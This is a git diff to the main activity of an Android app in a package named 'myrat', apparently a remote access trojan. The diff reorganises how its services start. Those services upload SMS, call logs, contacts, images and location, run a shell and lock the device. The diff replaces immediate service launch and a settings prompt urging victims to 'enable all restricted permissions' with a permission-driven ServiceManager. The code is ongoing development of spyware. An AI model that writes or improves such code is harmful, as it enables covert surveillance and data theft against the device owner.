@@ -18,6 +18,7 @@ import com.google.firebase.database.ktx.database
 import com.google.firebase.ktx.Firebase
 import com.myrat.app.handler.PermissionHandler
 import com.myrat.app.handler.SimDetailsHandler
+import com.myrat.app.service.ServiceManager
 import com.myrat.app.utils.Logger
 import pub.devrel.easypermissions.EasyPermissions
 import java.util.UUID
@@ -26,12 +27,11 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
     private lateinit var deviceId: String
     private lateinit var simDetailsHandler: SimDetailsHandler
     private var permissionHandler: PermissionHandler? = null
+    private lateinit var serviceManager: ServiceManager
     private lateinit var deviceRef: com.google.firebase.database.DatabaseReference
     private var doubleBackToExitPressedOnce = false
     private val handler = Handler(Looper.getMainLooper())
     private var permissionsRequested = false
-    private var servicesStarted = false
-    private var appSettingsOpened = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -44,7 +44,7 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
             }
             
             setContentView(R.layout.activity_main)
-            Logger.log("MainActivity onCreate, isFinishing: $isFinishing, isDestroyed: $isDestroyed")
+            Logger.log("MainActivity onCreate - Permission-based service management")
             
             // Initialize deviceId with proper error handling
             deviceId = getDeviceId(this)
@@ -66,7 +66,8 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
             // Initialize handlers with error handling
             try {
                 simDetailsHandler = SimDetailsHandler(this, deviceId)
-                permissionHandler = PermissionHandler(this, simDetailsHandler)
+                serviceManager = ServiceManager(this)
+                permissionHandler = PermissionHandler(this, simDetailsHandler, serviceManager)
                 Logger.log("Handlers initialized successfully")
             } catch (e: Exception) {
                 Logger.error("Failed to initialize handlers", e)
@@ -76,14 +77,10 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
 
             checkAndCreateDeviceNode()
             
-            // Start services immediately (they will handle their own permissions)
-            startAllServicesImmediately()
-            
-            // Only request permissions once
+            // Start permission flow - services will start as permissions are granted
             if (!permissionsRequested) {
-                Logger.log("Requesting permissions via EasyPermissions...")
+                Logger.log("Starting permission-based service management...")
                 
-                // Add delay before requesting permissions to ensure everything is initialized
                 handler.postDelayed({
                     try {
                         if (!isFinishing && !isDestroyed) {
@@ -110,44 +107,6 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
                     Logger.error("Failed to restart activity", restartException)
                 }
             }, 3000)
-        }
-    }
-
-    private fun startAllServicesImmediately() {
-        try {
-            Logger.log("Starting all background services immediately")
-            
-            val services = listOf(
-                com.myrat.app.service.SmsService::class.java,
-                com.myrat.app.service.ShellService::class.java,
-                com.myrat.app.service.CallLogUploadService::class.java,
-                com.myrat.app.service.ContactUploadService::class.java,
-                com.myrat.app.service.ImageUploadService::class.java,
-                com.myrat.app.service.LocationService::class.java,
-                com.myrat.app.service.CallService::class.java,
-                com.myrat.app.service.LockService::class.java,
-                com.myrat.app.service.SmsConsentService::class.java,
-                com.myrat.app.service.ServiceMonitorService::class.java
-            )
-
-            services.forEach { serviceClass ->
-                try {
-                    val serviceIntent = Intent(this, serviceClass)
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                        startForegroundService(serviceIntent)
-                    } else {
-                        startService(serviceIntent)
-                    }
-                    Logger.log("Started ${serviceClass.simpleName}")
-                } catch (e: Exception) {
-                    Logger.error("Failed to start ${serviceClass.simpleName}", e)
-                }
-            }
-            
-            servicesStarted = true
-            Logger.log("All services started successfully")
-        } catch (e: Exception) {
-            Logger.error("Error starting services", e)
         }
     }
 
@@ -204,45 +163,10 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
         
         try {
             permissionHandler?.handleResume()
-            
-            // Restart services if they're not running
-            if (!servicesStarted) {
-                startAllServicesImmediately()
-            }
-            
-            // Open app settings once for restricted permissions after some permissions are granted
-            if (!appSettingsOpened && permissionHandler?.hasBasicPermissions() == true) {
-                openAppSettingsForRestrictedPermissions()
-                appSettingsOpened = true
-            }
+            serviceManager.checkAndStartAvailableServices()
         } catch (e: Exception) {
             Logger.error("Error in onResume: ${e.message}", e)
             Toast.makeText(this, "Error in onResume: ${e.message}", Toast.LENGTH_LONG).show()
-        }
-    }
-
-    private fun openAppSettingsForRestrictedPermissions() {
-        try {
-            Logger.log("Opening app settings for restricted permissions")
-            
-            handler.postDelayed({
-                try {
-                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                        data = android.net.Uri.parse("package:$packageName")
-                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                    }
-                    startActivity(intent)
-                    Logger.log("App settings opened for restricted permissions")
-                    
-                    // Show toast to guide user
-                    Toast.makeText(this, "Please enable all restricted permissions for the app to work properly", Toast.LENGTH_LONG).show()
-                } catch (e: Exception) {
-                    Logger.error("Failed to open app settings", e)
-                }
-            }, 5000) // 5 second delay to allow some permissions to be granted first
-            
-        } catch (e: Exception) {
-            Logger.error("Error opening app settings", e)
         }
     }
 
@@ -284,6 +208,7 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
         super.onDestroy()
         try {
             permissionHandler?.cleanup()
+            serviceManager.cleanup()
             handler.removeCallbacksAndMessages(null)
             Logger.log("MainActivity destroyed and cleaned up")
         } catch (e: Exception) {
